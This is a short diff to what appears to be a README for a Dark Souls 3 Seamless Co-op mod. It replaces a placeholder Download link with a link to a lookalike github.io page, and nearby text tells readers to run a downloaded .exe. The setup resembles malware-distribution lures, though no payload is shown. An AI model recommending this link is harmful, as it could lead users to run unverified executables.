@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install the mod launcher and activate Seamless Co-op mode.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://seamless-coop-dark-souls3.github.io/.github/)
 
 ## 📸 Overview
 ![ds3-seamless-coop-world](https://github.com/user-attachments/assets/ba5df36d-4344-467d-b29e-b3c4930f4009)
